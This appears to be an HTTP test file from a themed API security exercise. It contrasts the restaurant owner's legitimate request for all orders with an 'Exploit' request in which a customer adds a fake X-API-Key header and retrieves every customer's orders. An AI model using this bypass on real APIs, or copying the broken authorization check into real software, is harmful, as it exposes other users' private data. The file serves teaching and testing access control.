# @import ../common/setup.http
@base = {{base_host}}/v204

# Sandy prepares for enrolling new restaurants, but for now only Krusty Krab is enrolled. In the app, Mr. Krabs can see orders from all customers.
# Menawhile, customers can see only their own orders.

###
# --- Legitimate Usage: Mr. Krabs can see orders from all customers ---
GET {{base}}/orders
X-API-Key: {{krabs_key}}

?? status == 200

### Plankton sends a fake API key and his own customer credentials
# --- Exploit: Plankton can see all orders in the system ---
GET {{base}}/orders
Authorization: {{plankton_auth}}
X-API-Key: fake

# Plankton sees all orders including SpongeBob's
?? status == 200
